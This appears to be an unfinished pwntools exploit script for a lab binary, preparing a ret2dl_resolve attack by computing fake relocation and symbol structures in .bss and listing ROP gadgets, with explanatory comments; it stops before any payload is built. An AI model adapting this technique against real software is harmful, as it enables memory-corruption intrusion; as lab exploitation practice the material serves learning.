#!/usr/bin/env python3
from pwn import process, ELF, log, context, pause
from fastpwn import pack
context(arch='amd64',os='linux',log_level='DEBUG')
binary=ELF('./lab')
p=binary.process()
offset=112
#### define sections of the binary
# since PIE is not enabled, these will be static offsets to whichever section we want
# we will not pack them, since after they are in bytes we cannot use as decimal offsets :(
bss=0x0804c028
plt=0x08049030
rel_plt=0x08048424
dynsym=0x08048260
dynstr=0x08048320
#### Important entries within PLT/GOT
got_read=0x0804c010
plt_read=0x08049050
log.info("")
log.warning("continue?")
log.info("")
pause()
log.info(".bss: \t%s"%hex(bss))
log.info(".plt: \t%s"%hex(plt))
log.info(".rel.plt: %s"%hex(rel_plt))
log.info(".dynsym:  %s"%hex(dynsym))
log.info(".dynstr:  %s"%hex(dynstr))
log.info("GOT entry to read: %s"%hex(got_read))
log.info("PLT entry to read: %s"%hex(plt_read))

stack=0x300
base = bss + stack
f_reloc = base + 0x14
f_sym = f_reloc + 8
f_symstr = f_sym + 0x10
f_cmd = f_symstr +7

f_reloc_offset = f_reloc-rel_plt
f_r_info = ((f_sym-dynsym) * 16) & ~0xff  # fake r_info = fake_sym - .dyn.sym * 16 "bitwise and" -256
# ~ also called the tilde, operator in python is the bitwise invert or compliment operator
# that sounded fancy, but it just means that it flips all the bits, so ~0xff = -256
f_r_info |= 7   # 7 bitwise or equals to f_r_info
f_st_name = f_symstr-dynstr

log.info('Fake Struct Information')
log.info('fake_reloc_offset : ' + hex(f_reloc))
log.info('addr_fake_cmd   : ' + hex(f_cmd))
log.info('addr_got_read   : ' + hex(got_read))
log.info('fake_r_info   : ' + hex(f_r_info))
log.info('fake_st_name   : ' + hex(f_st_name))

pop_ebp=0x080492f3
leave_ret=0x08049116
pop_ebx=0x08049022
vuln_addr=0x080491a6
